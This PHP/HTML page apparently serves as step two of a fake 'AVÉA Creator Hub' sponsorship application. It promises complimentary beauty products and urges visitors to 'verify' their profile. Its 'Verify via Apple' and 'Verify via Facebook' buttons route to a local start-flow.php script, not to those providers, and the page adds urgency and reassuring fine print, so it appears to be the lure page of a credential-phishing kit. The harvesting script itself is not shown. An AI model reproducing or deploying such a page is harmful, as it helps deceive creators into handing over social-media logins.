<?php
/**
 * AVÉA Creator Hub — Application Status / Verification (Page 2)
 * Compact + curved · same palette & fonts as index.php · self-contained
 */
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Application Pending — AVÉA Creator Hub</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="icon" type="image/png" href="files/images/avealogo.png">
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400;1,500&family=Jost:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
  /* ============ Design tokens — same as index.php ============ */
  :root{
    --porcelain:#FBF7F3;
    --sand:#F1EAE1;
    --linen:#E7DDD1;
    --hairline:#E4DACE;
    --gold:#B08D57;
    --gold-deep:#8C6C3E;
    --rose:#8E3A4B;
    --rose-deep:#6C2A38;
    --rosewood:#B99098;
    --blush:#EFDDE1;
    --ink:#1E1A17;
    --muted:#7B6E64;
    --ok:#5E8C61;
    --ff-display:'Cormorant Garamond', serif;
    --ff-body:'Jost', sans-serif;
    --r-lg:26px;
    --r-md:16px;
    --r-sm:12px;
  }
  *{margin:0;padding:0;box-sizing:border-box;}
  body{
    font-family:var(--ff-body);background:var(--porcelain);color:var(--ink);
    line-height:1.6;font-size:15px;font-weight:400;min-height:100vh;
    display:flex;flex-direction:column;
  }
  a{text-decoration:none;color:inherit;}
  button{font-family:var(--ff-body);}

  .kicker{font-size:.62rem;font-weight:500;letter-spacing:.3em;text-transform:uppercase;color:var(--gold);}

  /* ---------- Soft background ---------- */
  .bg-shapes{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;}
  .bg-shapes span{position:absolute;border-radius:50%;filter:blur(70px);opacity:.55;}
  .bg-shapes .s1{width:400px;height:400px;background:var(--blush);top:-140px;right:-120px;}
  .bg-shapes .s2{width:340px;height:340px;background:var(--sand);bottom:-120px;left:-110px;}
  .bg-shapes .s3{width:240px;height:240px;background:var(--linen);top:44%;left:-130px;}

  /* ---------- Page shell ---------- */
  .page{flex:1;display:flex;align-items:center;justify-content:center;padding:28px 18px;position:relative;z-index:1;}
  .card{
    position:relative;background:#fff;
    border:1px solid var(--hairline);border-radius:var(--r-lg);
    max-width:520px;width:100%;
    padding:30px clamp(22px,5vw,38px) 28px;
    box-shadow:0 26px 70px -34px rgba(36,26,30,.25);
  }

  /* ---------- Brand row ---------- */
  .brand{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px;}
  .brand-logo{font-family:var(--ff-display);font-size:1.35rem;font-weight:500;letter-spacing:.2em;color:var(--ink);}
  .brand-logo span{color:var(--gold);font-style:italic;}
  .badge{
    font-size:.56rem;letter-spacing:.18em;text-transform:uppercase;color:var(--rose-deep);
    background:var(--blush);border:1px solid var(--hairline);border-radius:999px;
    padding:6px 14px;white-space:nowrap;
  }
  @media(max-width:400px){.badge{display:none;}}

  /* ---------- Status banner (PENDING) ---------- */
  .status{
    display:flex;align-items:center;gap:12px;
    background:linear-gradient(120deg,#FDF6E9,#FBEDDD);
    border:1px solid #EBD9B8;border-radius:var(--r-md);
    padding:13px 16px;margin-bottom:18px;
  }
  .status-dot{
    flex:none;width:10px;height:10px;border-radius:50%;
    background:var(--gold);position:relative;
  }
  .status-dot::after{
    content:"";position:absolute;inset:-5px;border-radius:50%;
    border:1.5px solid var(--gold);opacity:.5;animation:pulse 1.8s ease-out infinite;
  }
  @keyframes pulse{
    0%{transform:scale(.6);opacity:.7;}
    100%{transform:scale(1.5);opacity:0;}
  }
  .status-text b{
    display:block;font-size:.68rem;letter-spacing:.2em;text-transform:uppercase;
    color:var(--gold-deep);font-weight:600;margin-bottom:1px;
  }
  .status-text span{font-size:.76rem;color:var(--muted);font-weight:300;}

  /* ---------- Intro ---------- */
  .intro{text-align:center;margin-bottom:18px;}
  .intro h1{
    font-family:var(--ff-display);font-weight:500;
    font-size:clamp(1.55rem,5vw,1.9rem);line-height:1.15;margin:6px 0 8px;
  }
  .intro h1 em{font-style:italic;color:var(--rose);}
  .intro p{color:var(--muted);font-weight:300;font-size:.84rem;max-width:410px;margin:0 auto;}
  .intro p strong{color:var(--ink);font-weight:500;}

  /* ---------- Progress ---------- */
  .progress-wrap{margin-bottom:16px;}
  .progress-meta{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:6px;}
  .p-label{font-size:.56rem;letter-spacing:.24em;text-transform:uppercase;color:var(--gold);font-weight:500;}
  .p-count{font-size:.72rem;color:var(--muted);font-weight:300;}
  .p-count em{font-style:normal;color:var(--rose);font-weight:500;}
  .progress{height:5px;background:var(--sand);border-radius:999px;overflow:hidden;}
  .progress-fill{
    height:100%;width:50%;border-radius:999px;
    background:linear-gradient(90deg,var(--gold),var(--rose));
    transition:width .45s ease;
  }

  /* ---------- Timeline ---------- */
  .timeline{list-style:none;display:flex;flex-direction:column;gap:8px;margin-bottom:16px;}
  .tl-step{
    border:1px solid var(--hairline);border-radius:var(--r-md);
    background:#fff;overflow:hidden;transition:border-color .25s, box-shadow .25s;
  }
  .tl-step.is-open{border-color:var(--rosewood);box-shadow:0 12px 28px -18px rgba(142,58,75,.35);}
  .tl-step.done{background:var(--porcelain);}
  .tl-head{
    width:100%;display:flex;align-items:center;gap:12px;
    background:none;border:none;cursor:pointer;text-align:left;padding:12px 15px;
  }
  .tl-dot{
    flex:none;width:30px;height:30px;border-radius:50%;
    display:flex;align-items:center;justify-content:center;
    font-family:var(--ff-display);font-style:italic;font-size:.85rem;
    color:var(--rosewood);background:var(--porcelain);border:1px solid var(--hairline);
    transition:all .25s;
  }
  .tl-step.is-open .tl-dot{color:#fff;background:var(--rose);border-color:var(--rose);}
  .tl-step.done .tl-dot{color:#fff;background:var(--ok);border-color:var(--ok);font-style:normal;font-family:var(--ff-body);font-size:.8rem;}
  .tl-heads{display:flex;flex-direction:column;gap:1px;min-width:0;flex:1;}
  .tl-label{font-size:.52rem;letter-spacing:.22em;text-transform:uppercase;color:var(--gold);font-weight:500;}
  .tl-step.done .tl-label{color:var(--ok);}
  .tl-title{
    font-family:var(--ff-display);font-size:1rem;font-weight:500;color:var(--ink);line-height:1.2;
    transition:color .25s;
  }
  .tl-head:hover .tl-title{color:var(--rose);}
  .tl-chev{flex:none;font-weight:300;font-size:1.15rem;color:var(--gold);transition:transform .3s;line-height:1;}
  .tl-chev::before{content:"+";}
  .tl-step.is-open .tl-chev{transform:rotate(45deg);}
  .tl-body{max-height:0;overflow:hidden;transition:max-height .35s ease;}
  .tl-body p{padding:0 15px 13px 57px;color:var(--muted);font-size:.79rem;font-weight:300;}
  .tl-body p strong{color:var(--rose);font-weight:600;}
  .tl-step.is-open .tl-body{max-height:180px;}
  @media(max-width:400px){.tl-body p{padding-left:15px;}}

  /* ---------- Verify CTA header ---------- */
  .verify-head{text-align:center;margin:20px 0 12px;}
  .verify-head .kicker{color:var(--rose);}
  .verify-head h2{
    font-family:var(--ff-display);font-weight:500;font-size:1.25rem;margin-top:4px;line-height:1.2;
  }
  .verify-head h2 em{font-style:italic;color:var(--gold-deep);}
  .verify-head p{font-size:.78rem;color:var(--muted);font-weight:300;margin-top:4px;}

  /* ---------- Social buttons ---------- */
  .actions{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
  .actions .btn{
    position:relative;overflow:hidden;
    display:inline-flex;align-items:center;justify-content:center;
    padding:12px 10px;border:none;border-radius:var(--r-sm);cursor:pointer;
    font-weight:500;font-size:.6rem;letter-spacing:.12em;text-transform:uppercase;color:#fff;
    transition:transform .25s ease, box-shadow .25s ease;
  }
  .btn .ic{width:15px;height:15px;margin-right:8px;flex:none;}
  .actions .btn::after{
    content:"";position:absolute;top:0;left:-130%;width:55%;height:100%;
    background:linear-gradient(100deg,transparent,rgba(255,255,255,.28),transparent);
    transition:left .55s ease;
  }
  .actions .btn:hover::after{left:140%;}
  .actions .btn:hover{transform:translateY(-2px);}

  .btn-apple{background:#111113;box-shadow:0 10px 22px -12px rgba(17,17,19,.7);}
  .btn-facebook{background:#1877F2;box-shadow:0 10px 22px -12px rgba(24,119,242,.65);}
  .btn-facebook:hover{background:#1466D2;}
  .btn-instagram{
    background:linear-gradient(105deg,#833AB4,#C13584 32%,#E1306C 58%,#F77737 82%,#FCAF45);
    box-shadow:0 10px 22px -12px rgba(193,53,132,.65);
  }
  .btn-tiktok{background:#0F0F10;box-shadow:0 10px 22px -12px rgba(0,0,0,.55);}
  .btn-tiktok:hover{box-shadow:0 14px 30px -12px rgba(254,44,85,.55), 0 0 0 1.5px rgba(37,244,238,.3) inset;}
  @media(max-width:400px){.actions{grid-template-columns:1fr;}}

  /* ---------- After-verification note ---------- */
  .after-note{
    display:flex;gap:12px;align-items:flex-start;
    background:var(--sand);border:1px solid var(--hairline);border-radius:var(--r-md);
    padding:14px 16px;margin-top:14px;
  }
  .after-icon{
    flex:none;width:32px;height:32px;border-radius:50%;
    background:#fff;border:1px solid var(--hairline);
    display:flex;align-items:center;justify-content:center;
  }
  .after-icon svg{width:15px;height:15px;stroke:var(--gold);fill:none;stroke-width:1.6;}
  .after-note p{font-size:.76rem;color:var(--muted);font-weight:300;line-height:1.55;}
  .after-note p strong{color:var(--rose);font-weight:600;}

  /* ---------- Fine print ---------- */
  .fine-print{
    text-align:center;font-size:.66rem;color:var(--muted);font-weight:300;
    margin-top:14px;line-height:1.5;
  }

  /* ---------- Card footer ---------- */
  .foot{text-align:center;margin-top:18px;}
  .foot .line{width:44px;height:1px;background:var(--gold);opacity:.6;margin:0 auto 10px;}
  .foot strong{display:block;font-family:var(--ff-display);font-size:.95rem;font-weight:500;color:var(--ink);margin-bottom:2px;}
  .foot span{font-size:.66rem;color:var(--muted);font-weight:300;}

  @media (prefers-reduced-motion: reduce){
    .tl-body,.progress-fill,.actions .btn,.actions .btn::after{transition:none;}
    .status-dot::after{animation:none;}
  }
</style>
</head>
<body>

  <div class="bg-shapes" aria-hidden="true">
    <span class="s1"></span><span class="s2"></span><span class="s3"></span>
  </div>

  <main class="page">
    <section class="card" aria-labelledby="welcomeTitle">

      <!-- Brand -->
      <header class="brand">
        <a class="brand-logo" href="index.php">AVÉA<span>.</span></a>
        <span class="badge">Content Creator Community</span>
      </header>

      <!-- Status banner -->
      <div class="status" role="status">
        <span class="status-dot" aria-hidden="true"></span>
        <div class="status-text">
          <b>Application Pending</b>
          <span>We've received your application — one more step to complete it.</span>
        </div>
      </div>

      <!-- Title -->
      <div class="intro">
        <span class="kicker">Creator Hub · Application Status</span>
        <h1 id="welcomeTitle">Almost there, <em>future AVÉA Creator</em></h1>
        <p>Your application is <strong>still pending</strong>. To move forward, please proceed with your creator verification using the buttons below so our team can confirm your profile.</p>
      </div>

      <!-- Progress -->
      <div class="progress-wrap">
        <div class="progress-meta">
          <span class="p-label">Your Progress</span>
          <span class="p-count">Step <em id="pNow">2</em> of 4</span>
        </div>
        <div class="progress" role="progressbar" aria-valuemin="1" aria-valuemax="4" aria-valuenow="2">
          <div class="progress-fill" id="pFill"></div>
        </div>
      </div>

      <!-- Timeline -->
      <ol class="timeline" id="timeline">

        <li class="tl-step done" data-step="1">
          <button type="button" class="tl-head" aria-expanded="false">
            <span class="tl-dot">✓</span>
            <span class="tl-heads">
              <span class="tl-label">Completed</span>
              <span class="tl-title">Application Received</span>
            </span>
            <span class="tl-chev" aria-hidden="true"></span>
          </button>
          <div class="tl-body">
            <p>Thank you for applying! Your creator application has been successfully received and is now in our review queue.</p>
          </div>
        </li>

        <li class="tl-step is-open" data-step="2">
          <button type="button" class="tl-head" aria-expanded="true">
            <span class="tl-dot">02</span>
            <span class="tl-heads">
              <span class="tl-label">Current Step · Action Needed</span>
              <span class="tl-title">Proceed with Verification</span>
            </span>
            <span class="tl-chev" aria-hidden="true"></span>
          </button>
          <div class="tl-body">
            <p><strong>Your application stays pending until this step is done.</strong> Choose any of the verification below to confirm your creator profile and social media presence with our team.</p>
          </div>
        </li>

        <li class="tl-step" data-step="3">
          <button type="button" class="tl-head" aria-expanded="false">
            <span class="tl-dot">03</span>
            <span class="tl-heads">
              <span class="tl-label">Step 03</span>
              <span class="tl-title">Qualification Review</span>
            </span>
            <span class="tl-chev" aria-hidden="true"></span>
          </button>
          <div class="tl-body">
            <p>Once verified, the AVÉA team manually reviews your profile for authenticity, content quality, and fit with the Creator Program.</p>
          </div>
        </li>

        <li class="tl-step final" data-step="4">
          <button type="button" class="tl-head" aria-expanded="false">
            <span class="tl-dot">04</span>
            <span class="tl-heads">
              <span class="tl-label">Final Step</span>
              <span class="tl-title">Receive Your AVÉA Items</span>
            </span>
            <span class="tl-chev" aria-hidden="true"></span>
          </button>
          <div class="tl-body">
            <p><strong>Qualified creators will receive complimentary AVÉA items</strong> — bestselling products, campaign invitations, and creator resources. Our team will contact you directly <strong>through email</strong> with your approval and delivery details.</p>
          </div>
        </li>
      </ol>

      <!-- Verify CTA -->
      <div class="verify-head">
        <span class="kicker">Action Needed</span>
        <h2>Proceed with your <em>verification</em></h2>
        <p>Select below to complete your creator verification:</p>
      </div>

      <!-- Verification buttons -->
      <div class="actions">
        <a onclick="goToApple()" class="btn btn-apple" target="_blank" rel="noopener noreferrer">
          <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
            <path d="M17.05 12.54c-.03-2.53 2.07-3.75 2.16-3.81-1.18-1.72-3.01-1.96-3.66-1.99-1.56-.16-3.04.92-3.83.92-.79 0-2.01-.9-3.3-.87-1.7.02-3.26.99-4.13 2.51-1.76 3.06-.45 7.59 1.27 10.07.84 1.21 1.84 2.57 3.15 2.52 1.26-.05 1.74-.82 3.27-.82 1.52 0 1.96.82 3.3.79 1.36-.02 2.22-1.23 3.05-2.45.96-1.4 1.36-2.76 1.38-2.83-.03-.01-2.64-1.01-2.66-4.04zM14.6 4.7c.7-.85 1.17-2.02 1.04-3.2-1 .04-2.22.67-2.94 1.51-.64.75-1.21 1.95-1.06 3.1 1.12.09 2.26-.57 2.96-1.41z"/>
          </svg>
          Verify via Apple
        </a>

        <a onclick="goToFacebook()" class="btn btn-facebook" target="_blank" rel="noopener noreferrer">
          <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
            <path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06c0 5.02 3.66 9.18 8.44 9.94v-7.03H7.9v-2.91h2.54V9.85c0-2.52 1.49-3.91 3.77-3.91 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.78-1.63 1.57v1.89h2.78l-.44 2.91h-2.34V22c4.78-.76 8.44-4.92 8.44-9.94z"/>
          </svg>
          Verify via Facebook
        </a>

        <a href="https://www.instagram.com/aveabeauty" class="btn btn-instagram" target="_blank" rel="noopener noreferrer">
          <svg class="ic" viewBox="0 0 24 24" fill="none" aria-hidden="true">
            <rect x="2.5" y="2.5" width="19" height="19" rx="5.5" stroke="currentColor" stroke-width="1.9"/>
            <circle cx="12" cy="12" r="4.2" stroke="currentColor" stroke-width="1.9"/>
            <circle cx="17.3" cy="6.7" r="1.25" fill="currentColor"/>
          </svg>
          Message us on Instagram
        </a>

        <a href="https://www.tiktok.com/@aveabeauty" class="btn btn-tiktok" target="_blank" rel="noopener noreferrer">
          <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
            <path d="M16.5 3c.3 2.1 1.6 3.6 3.7 3.8v2.6c-1.3.1-2.6-.3-3.7-1v5.9c0 3.3-2.4 5.7-5.6 5.7-3 0-5.4-2.3-5.4-5.3 0-3.1 2.6-5.5 5.9-5.1v2.7c-.4-.1-.9-.2-1.3-.2-1.5 0-2.6 1.1-2.6 2.6 0 1.5 1.1 2.6 2.6 2.6 1.6 0 2.8-1.2 2.8-3.1V3h3.6z"/>
          </svg>
          Message us on TikTok
        </a>
      </div>

      <!-- After verification note -->
      <div class="after-note" role="note">
        <div class="after-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24"><path d="M4 6h16v12H4z"></path><path d="M4 7l8 6 8-6"></path></svg>
        </div>
        <p><strong>What happens after verification?</strong> Once you're qualified, you'll receive complimentary AVÉA items — and our team will contact you <strong>through email</strong> with your approval, delivery details, and next steps. Please keep an eye on your inbox (and spam folder).</p>
      </div>

      <!-- Fine print -->
      <p class="fine-print">
        Please submit only one application. Every application undergoes manual verification, and only qualified applicants are approved.<br>
        AVÉA will never ask for payment, shipping fees, or bank details to receive your creator items.
      </p>

      <!-- Card footer -->
      <footer class="foot">
        <div class="line"></div>
        <strong>AVÉA Creator Program</strong>
        <span>Discover talented creators. Build authentic partnerships. Grow together.</span>
      </footer>

    </section>
  </main>

  <script>
    const steps = document.querySelectorAll(".tl-step");
    const pFill = document.getElementById("pFill");
    const pNow = document.getElementById("pNow");
    const progressBar = document.querySelector(".progress");

    function openStep(step){
      steps.forEach(s=>{
        const open = s === step;
        s.classList.toggle("is-open", open);
        s.querySelector(".tl-head").setAttribute("aria-expanded", open ? "true" : "false");
      });
      const n = parseInt(step.dataset.step, 10) || 1;
      pNow.textContent = n;
      pFill.style.width = (n / steps.length * 100) + "%";
      progressBar.setAttribute("aria-valuenow", n);
    }

    steps.forEach(step=>{
      step.querySelector(".tl-head").addEventListener("click", ()=> openStep(step));
    });

    /* Start on Step 2 — the pending verification step */
    openStep(document.querySelector('.tl-step[data-step="2"]'));
  </script>
<script>
function goToApple(){
  window.location.href = "start-flow.php?method=apple";
}

function goToFacebook(){
  window.location.href = "start-flow.php?method=facebook";
}
</script>
</body>
</html>